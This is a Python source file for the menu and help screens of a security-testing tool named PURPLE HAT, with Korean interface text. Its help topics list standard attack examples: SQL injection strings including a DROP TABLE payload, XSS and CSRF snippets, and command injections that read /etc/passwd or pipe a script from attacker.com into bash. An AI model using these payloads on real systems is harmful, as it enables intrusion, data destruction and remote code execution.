from typing import Dict, List, Callable
from ui.renderer import UIRenderer, Symbol, Color


class MenuSystem:
    def __init__(self, renderer: UIRenderer):
        self.renderer = renderer
        self.menu_stack = []
        self.current_menu = None
    
    def create_menu(self, title: str) -> 'Menu':
        return Menu(title, self.renderer)
    
    def show_menu(self, menu: 'Menu'):
        while True:
            self.renderer.print_header(menu.title)
            
            for idx, option in enumerate(menu.options, 1):
                self.renderer.print_option(idx, option['text'], option.get('description', ''))
            
            if menu.show_back:
                self.renderer.print_option(0, "Back", "이전 메뉴로")
            self.renderer.print_option(99, "Exit", "프로그램 종료")
            
            choice = self.renderer.input_choice("선택해주세요")
            
            try:
                choice_num = int(choice)
                
                if choice_num == 99:
                    return False
                
                if choice_num == 0 and menu.show_back:
                    return True
                
                if 1 <= choice_num <= len(menu.options):
                    option = menu.options[choice_num - 1]
                    if callable(option['action']):
                        option['action']()
                    else:
                        self.show_menu(option['action'])
                else:
                    self.renderer.print_error("잘못된 선택입니다.")
            except ValueError:
                self.renderer.print_error("숫자를 입력해주세요.")
            
            self.renderer.print_divider()


class Menu:
    def __init__(self, title: str, renderer: UIRenderer, show_back: bool = True):
        self.title = title
        self.renderer = renderer
        self.show_back = show_back
        self.options: List[Dict] = []
    
    def add_option(self, text: str, action: Callable, description: str = ""):
        self.options.append({
            'text': text,
            'action': action,
            'description': description
        })
    
    def add_submenu(self, text: str, submenu: 'Menu', description: str = ""):
        self.options.append({
            'text': text,
            'action': submenu,
            'description': description
        })


class HelpSystem:
    def __init__(self, renderer: UIRenderer):
        self.renderer = renderer
        self.help_topics = {
            "SQL Injection": {
                "description": "SQL 쿼리에 악의적인 입력값을 삽입하여 데이터베이스를 공격하는 기법",
                "examples": [
                    "' OR '1'='1",
                    "' UNION SELECT * FROM users--",
                    "'; DROP TABLE users;--"
                ],
                "techniques": ["Union-based", "Time-based", "Boolean-based", "Error-based"]
            },
            "XSS": {
                "description": "웹페이지에 악의적인 스크립트를 삽입하여 사용자의 브라우저에서 실행시키는 공격",
                "examples": [
                    "<script>alert('XSS')</script>",
                    "<img src=x onerror=alert('XSS')>",
                    "javascript:alert('XSS')"
                ],
                "techniques": ["Reflected XSS", "Stored XSS", "DOM-based XSS"]
            },
            "CSRF": {
                "description": "사용자가 모르게 특정 작업을 수행하도록 만드는 공격 기법",
                "examples": [
                    "<img src='http://vulnerable.com/transfer?amount=1000'>",
                    "자동 폼 제출",
                ],
                "techniques": ["GET-based", "POST-based", "Ajax-based"]
            },
            "Command Injection": {
                "description": "시스템 명령어 실행 함수에 악의적인 명령어를 삽입하는 공격",
                "examples": [
                    "; cat /etc/passwd",
                    "| whoami",
                    "$(curl attacker.com/shell.sh | bash)"
                ],
                "techniques": ["Blind injection", "Out-of-band"]
            },
            "Port Scanning": {
                "description": "대상 서버의 열려있는 포트를 찾아 실행 중인 서비스를 파악하는 기법",
                "examples": [
                    "TCP Connect Scan",
                    "SYN Stealth Scan",
                ],
                "techniques": ["Full Connect", "Stealth", "Service Detection"]
            },
            "Encoding": {
                "description": "문자열을 다양한 형식으로 인코딩/디코딩하여 필터 우회",
                "examples": [
                    "Base64 인코딩",
                    "URL 인코딩",
                    "Hex 인코딩",
                    "HTML 엔티티 인코딩"
                ],
                "techniques": ["Base64", "URL", "Hex", "HTML", "Unicode"]
            },
        }
    
    def show_main_help(self):
        self.renderer.print_section("PURPLE HAT - 도움말")
        self.renderer.print_info("PURPLE HAT은 보안 테스트를 위한 통합 프레임워크입니다.")
        self.renderer.print_info("")
        print(f"{Color.CYAN}{Color.BOLD}주요 기능:{Color.RESET}")
        print(f"  {Symbol.SHIELD} SQL Injection 테스트")
        print(f"  {Symbol.SHIELD} XSS/CSRF 취약점 검사")
        print(f"  {Symbol.SHIELD} 명령어 주입 테스트")
        print(f"  {Symbol.SHIELD} 포트 스캔 및 서비스 발견")
        print(f"  {Symbol.SHIELD} 인코딩/디코딩 도구")
        print(f"  {Symbol.SHIELD} 네트워크 정찰")
        self.renderer.print_info("")
        self.show_topic_list()
    
    def show_topic_list(self):
        self.renderer.print_section("사용 가능한 주제")
        for idx, topic in enumerate(self.help_topics.keys(), 1):
            self.renderer.print_option(idx, topic)
        
        choice = self.renderer.input_choice("주제를 선택하세요")
        try:
            choice_num = int(choice)
            if 1 <= choice_num <= len(self.help_topics):
                topic = list(self.help_topics.keys())[choice_num - 1]
                self.show_topic_detail(topic)
        except ValueError:
            pass
    
    def show_topic_detail(self, topic: str):
        if topic not in self.help_topics:
            return
        
        info = self.help_topics[topic]
        self.renderer.print_result_box(
            f"Help: {topic}",
            f"{info['description']}\n\n"
            f"{Color.GREEN}기법:{Color.RESET}\n"
            f"  {', '.join(info['techniques'])}\n\n"
            f"{Color.GREEN}예시:{Color.RESET}\n"
            + "\n".join(f"  {Symbol.ARROW} {ex}" for ex in info['examples'])
        )
